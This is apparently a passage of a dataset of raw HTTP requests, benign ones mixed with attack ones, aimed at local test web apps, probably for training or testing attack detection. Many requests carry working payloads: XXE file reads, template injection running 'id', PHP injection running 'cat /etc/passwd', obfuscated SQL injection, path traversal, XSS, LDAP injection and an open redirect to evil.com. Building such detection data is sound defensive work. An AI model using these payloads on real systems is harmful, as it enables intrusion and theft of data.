+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=34DCA0417AA4A3A04D8840D81D019431
+Referer: http://malicious.com/<?xml version=""1.0"" encoding=""windows-1252""?><!DOCTYPE root [<!ENTITY s1 SYSTEM ""file:///proc/net/tcp""> ]><data>&s1;</data>
+Host: localhost
+Connection: close
+
+"
+"GET /vulnerabilities/sqli/?id=1&jox=5923 HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=6A448B57BA58ABC143CBB0630369C2DA
+Referer: http://malicious.com/${<#assign ex=""freemarker.template.utility.Execute""?new()> ${ex(""id"")}}%20
+Host: localhost
+Connection: close
+
+"
+"GET /?gba=8594 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 431b902f-6a24-4dfd-a7af-f2af4f61a8d2
+
+"
+"GET /vulnerabilities/sqli/?id=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=1E28D27050BB283C69990E451F65BC74
+Host: localhost
+Connection: close"
+"GET /?thg=1226 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 72da38bc-4e76-47df-9b06-6cdff7301824
+
+"
+"GET /vulnerabilities/sqli/?id=1&ama=5709 HTTP/1.1
+User-Agent: <form action=""/cart/checkout"" method=""GET""><input type=""text"" name=""user_id"" value=""0%20""><input type=""text"" name=""_csrf"" value=""attacker""><input type=""image"" src=""x"">
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=E54D6579F22AE825B56BA4399DD37460
+Host: localhost
+Connection: close
+
+"
+"GET /?ich=2846 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 66e188c3-0cd0-45d0-bcde-ae043dad8a6f
+
+"
+"POST /install/install.php?step=4 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 95
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+DIR_FS_DOCUMENT_ROOT=.%2F&DB_DATABASE=%27%29%3Bpassthru%28%27cat+%2Fetc%2Fpasswd%27%29%3B%2F%2A"
+"GET /?hjc=8860 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: da162a11-6cfd-4109-808b-0f8ebdbbe31d
+
+"
+"POST / HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9
+Connection: close
+Content-Length: 87
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+option=moopenid&email=uzmpvjPBmwEO3tFXq0vlJg%3D%3D&appName=rlHeqZw2vrPzOiWWfCParA%3D%3D"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=4F4233D31F115C5452F75E84F8C8874B
+Host: localhost
+Content-Type: application/json
+Connection: close
+Content-Length: 175
+
+{""id"": ""<?xml version=\""1.0\"" standalone=\""yes\""?><!DOCTYPE foo [<!ENTITY test SYSTEM \""expect://C:/xampp/apache/logs/access.log\""> ]><data>&test;</data>"", ""action"": ""search""}"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=D0B10397654A5566C1EBD5B8BB0FA6C6
+Host: localhost
+Content-Type: application/xml
+Connection: close
+Content-Length: 309
+
+<?xml version=""1.0"" encoding=""UTF-8""?>
+<user>
+    <id><?xml-stylesheet type='text/xsl' href='data:text/xsl,<?xml version=""1.0""?><xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""><xsl:template match=""/"">YxQnflI4</xsl:template></xsl:stylesheet>?></id>
+    <name>admin</name>
+</user>"
+"GET /?uwe=3647 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 6118169a-143e-4171-92d8-aa0bd7f2cfa8
+
+"
+"GET /rest/products/search?q=%2D%32%30%37%31%27%2F%2A%21%6F%52%2A%2F%31%30%30%32%3D%43%54%58%53%59%53%2E%44%52%49%54%48%53%58%2E%73%4E%28%31%30%30%32%2C%28%63%68%52%28%31%31%33%29%7C%7C%63%68%52%28%31%31%32%29%7C%7C%63%68%52%28%39%38%29%7C%7C%63%68%52%28%31%30%37%29%7C%7C%63%68%52%28%31%31%33%29%7C%7C%28%2F%2A%21%53%45%6C%65%43%74%2A%2F%28%2F%2A%21%43%41%73%45%2A%2F%2F%2A%21%57%48%45%6E%2A%2F%28%31%30%30%32%3D%31%30%30%32%29%2F%2A%21%54%68%45%4E%2A%2F%31%2F%2A%21%45%4C%53%65%2A%2F%30%2F%2A%21%45%6E%44%2A%2F%29%2F%2A%21%66%52%4F%6D%2A%2F%2F%2A%21%64%75%61%4C%2A%2F%29%7C%7C%63%68%52%28%31%31%33%29%7C%7C%63%68%52%28%39%38%29%7C%7C%63%68%52%28%31%31%32%29%7C%7C%63%68%52%28%31%32%32%29%7C%7C%63%68%52%28%31%31%33%29%29%29%2F%2A%21%6F%52%2A%2F%27%6B%61%79%72%27%3D%27%55%66%43%48 HTTP/1.1
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0
+Referer: http://localhost:3000/rest/products/search
+Host: localhost:3000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Connection: close"
+"GET /manager/html?jil=2526 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; es-es) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1
+Authorization: Basic Y3hzZGs6cGFzc3dvcmQ=
+Accept-Encoding: gzip
+Connection: close
+
+"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=13F68485104F5BFA437AF5451E01AC31
+Host: localhost
+Content-Type: application/json
+Connection: close
+Content-Length: 41
+
+{""id"": ""14UmSmail=*"", ""action"": ""search""}"
+"GET /?sic=2606 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 46ed0f63-44d3-4518-9936-db01755bfa52
+
+&extra_info=search=UNION+ALL"
+"GET /?ozu=8466 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
+Connection: close
+Accept-Encoding: gzip
+
+"
+"GET /rest/products/search?q=%74%65%73%74%7C%7C%28%2F%2A%21%73%45%4C%45%43%54%2A%2F%30%78%37%35%37%38%37%33%34%39%2F%2A%21%66%52%6F%4D%2A%2F%2F%2A%21%44%55%61%4C%2A%2F%2F%2A%21%77%68%65%72%45%2A%2F%32%30%39%38%3D%32%30%39%38%2F%2A%21%6F%52%2A%2F%65%78%74%72%61%43%54%76%61%6C%55%45%28%31%34%38%31%2C%43%6F%6E%43%61%74%28%30%78%35%63%2C%30%78%37%31%37%30%36%32%36%62%37%31%2C%28%2F%2A%21%73%45%4C%45%43%54%2A%2F%28%45%4C%74%28%31%34%38%31%2F%2A%21%42%65%54%77%45%45%4E%2A%2F%31%34%38%31%2F%2A%21%41%6E%44%2A%2F%31%34%38%31%2C%31%29%29%29%2C%30%78%37%31%36%32%37%30%37%61%37%31%29%29%29%7C%7C HTTP/1.1
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0
+Referer: http://localhost:3000/rest/products/search
+Host: localhost:3000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Connection: close"
+"GET /?lyb=9377 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: c0afe3d9-8ab2-492d-a14b-9cb865564943
+
+"
+"GET /?zym=0476 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: bb102542-cdd9-4569-95c1-165531edb2ce
+
+"
+"GET /?ieb=7868 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 65e06245-565d-4e7e-a4d2-c5974d9c636a
+
+"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=4EE53F5D73E61096C398FD60FFCAE9B0
+Host: localhost
+Content-Type: application/json
+Connection: close
+Content-Length: 61
+
+{""id"": ""*))%00*))%00*))%00userPassword*"", ""action"": ""search""}"
+"GET /?kiz=2858 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: acfbb4f7-b8ec-4fa1-9c98-5e24bbdfd373
+
+"
+"GET /vulnerabilities/sqli/?id=@(7*'7'}} HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=3FB1B6A8A795FA96D09E9FF97DE4C8AB
+Host: localhost
+Connection: close"
+"GET /rest/products/search?q=""<base&kow=3226 src=x onkeyup=print()>"" HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=FDD60BAB45C41ED47C71768362729FEA
+Host: localhost:3000
+Connection: close
+
+"
+"GET /?feq=1942 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 8fb2abd3-055c-4067-9b65-6ad4a8d0f7aa
+
+"
+"GET /vulnerabilities/sqli/?id=1&elc=1341 HTTP/1.1
+User-Agent: )(&( description*\x00
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=743042C3C5D0E3B8213DAE5BD230A0A1
+Host: localhost
+Connection: close
+
+"
+"GET /?inb=6141 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 307a8f99-5758-403d-a4ab-32e0662c12cf
+
+"
+"GET /?mca=3886 HTTP/1.1
+Host: localhost:3000
+User-Agent: curl/7.68.0
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: a7856fc8-5eb4-4553-a563-3a52268636f1
+
+"
+"GET /vulnerabilities/sqli/?id=/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=DEF83823D7879C8A4D069FC14E7B3DA3
+Host: localhost
+Connection: close"
+"GET /?ede=7131&q=select+*+from+users HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 6274eae8-50da-4501-beed-4a538ebbd4ca
+
+"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=D05CE4917CCCDA116343A38428CBE1CB
+Host: localhost
+Content-Type: application/json
+Connection: close
+Content-Length: 91
+
+{""id"": ""'\""><select oninput=window.alert(String.fromCharCode(49))>\""'"", ""action"": ""search""}"
+"GET /rest/products/search?q=..\..\..\..\..\windows\system32\drivers\etc\hosts HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=5B64CD23068E909966AB9A153FC267DE
+Host: localhost:3000
+Connection: close"
+"GET /vulnerabilities/sqli/?id=1&zhn=9125 HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=A13B85E88C9191402C2D8D626D0B56D0
+Referer: http://malicious.com/..../%u2216..../%u2216..../%u2216..../%u2216..../%u2216etc%u2216passwd
+Host: localhost
+Connection: close
+
+"
+"GET /?vcn=5265 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 76889b85-440d-42be-9ba0-b4948876c166
+
+"
+"GET /rest/products/search?q=<em><h1 style=""color:red;"">defaced</h1> HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=0D9978AADAA7E9FFD25E33E95E916C42
+Host: localhost:3000
+Connection: close"
+"GET /rest/products/search?q=apple&cache_id=378a8c75-6eb0-4dce-adf0-fc0515feef68&id=1 OR 1=1 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 378a8c75-6eb0-4dce-adf0-fc0515feef68"
+"GET /?ful=6042&file=../../images/logo.png HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: e2f88223-dad7-4d96-9cf5-cd07853edca2
+
+"
+"GET /?mng=6176 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: a7167c92-a648-44e0-b36e-feaaf988593e
+
+"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=7AA4F461CC90EF2D99204C7F2D6EC1A5
+Host: localhost
+Content-Type: application/json
+Connection: close
+Content-Length: 37
+
+{""id"": ""/*/*cn*"", ""action"": ""search""}"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=03DF85D390EEAE354758C1D53B90A6E3
+Host: localhost
+Content-Type: application/json
+Connection: close
+Content-Length: 40
+
+{""id"": ""*))|(*))&("", ""action"": ""search""}"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=834975D4AE48F9035990876292B118EF
+Host: localhost
+Content-Type: application/json
+Connection: close
+Content-Length: 53
+
+{""id"": ""/forward/?go=//evil.com"", ""action"": ""search""}"
